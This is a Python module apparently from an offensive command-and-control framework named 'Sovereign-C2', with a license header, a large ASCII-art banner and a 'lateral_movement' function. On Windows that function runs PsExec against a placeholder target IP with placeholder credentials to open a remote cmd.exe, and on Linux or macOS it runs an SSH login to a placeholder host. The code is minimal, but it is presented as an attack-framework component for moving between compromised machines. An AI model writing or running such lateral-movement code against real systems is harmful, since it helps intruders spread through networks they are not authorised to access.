######################################################################################################################################################################## 
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”).
# Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, 
# and to permit persons to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be
# included in all copies or substantial portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A  
# PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
########################################################################################################################################################################

import os

# Banner
def print_banner():
    banner = r"""
  _________                                   .__                         _________  ________             ___________                                                  __    
 /   _____/ _______  __  ____ _______   ____  |__| ____    ____           \_   ___ \ \_____  \            \_   _____/____________     _____   ______  _  _____________|  | __
 \_____  \ /  _ \  \/ /_/ __ \\_  __ \_/ __ \ |  |/ ___\  /    \   ______ /    \  \/  /  ____/    ______   |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /
 /        (  <_> )   / \  ___/ |  | \/\  ___/ |  / /_/  >|   |  \ /_____/ \     \____/       \   /_____/   |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    < 
/_______  /\____/ \_/   \___  >|__|    \___  >|__\___  / |___|  /          \______  /\_______ \            \___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \
        \/                  \/             \/   /_____/       \/                  \/         \/                \/                \/       \/     \/                        \/

                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/      (_ _)
                                 /\      {====}     )___(        | |____....----....____         _
                      (\=,      //\\      )__(     /_____\       | |\                . .~~~~---~~ |
      __    |'-'-'|  //  .\    (    )    /____\     |   |        | | |         __\\ /(/(  .       |
     /  \   |_____| (( \_  \    )__(      |  |      |   |        | | |      <--= '|/_/_( /|       |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |        | | |       }\~) | / _(./      ..|
    /____\   |   |  (/     \    |  |      |  |      |   |        | | |.:::::::\\/      --...::::::|
     |  |    |   |   | _.-'|    |  |      |  |      |   |        | | |:::::::::\//::\\__\:::::::::|
     |__|    )___(    )___(    /____\    /____\    /_____\       | | |::::::::_//_:_//__\\_:::::::| 
    (====)  (=====)  (=====)  (======)  (======)  (=======)      | | |::::::::::::::::::::::::::::|
    }===={  }====={  }====={  }======{  }======{  }======={      | |/:::''''~~~~'''':::::::::::::'~
   (______)(_______)(_______)(________)(________)(_________)     | |

           Sovereign-C2 Framework
    """
    print(banner)
    print("Sovereign-c2 - 41PH4-01 & Our Community\n")

def lateral_movement():
    if os.name == 'nt':
        # Windows lateral movement example using PsExec
        command = 'psexec \\\\target-ip -u user -p password cmd.exe'
        os.system(command)
        return "Lateral movement attempt on Windows"

    elif os.name == 'posix':
        # Linux/MacOS lateral movement example using SSH
        command = 'ssh user@target-ip'
        os.system(command)
        return "Lateral movement attempt on Linux/MacOS"

def execute(*args):
    return lateral_movement()

if __name__ == "__main__":
    print(lateral_movement())

